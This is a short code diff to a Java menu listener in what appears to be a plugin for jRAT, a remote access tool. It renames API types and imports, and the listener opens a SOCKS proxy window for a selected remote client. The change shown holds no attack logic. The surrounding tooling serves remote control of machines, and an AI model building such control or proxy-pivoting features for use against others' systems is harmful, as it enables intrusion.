@@ -2,16 +2,16 @@ package se.jrat.plugin.socks.client;
 
 import java.util.List;
 
-import jrat.api.RATMenuItemActionListener;
-import jrat.api.RATObject;
+import jrat.api.Client;
+import jrat.api.ui.RATMenuItemActionListener;
 
 public class MenuListener implements RATMenuItemActionListener {
 
 	@Override
-	public void onClick(List<RATObject> servers) {
+	public void onClick(List<Client> servers) {
 		try {
 			if (servers.size() > 0) {
-				final RATObject server = servers.get(0);		
+				final Client server = servers.get(0);		
 				new FrameSocks(server).setVisible(true);
 			}
 		} catch (Exception ex) {
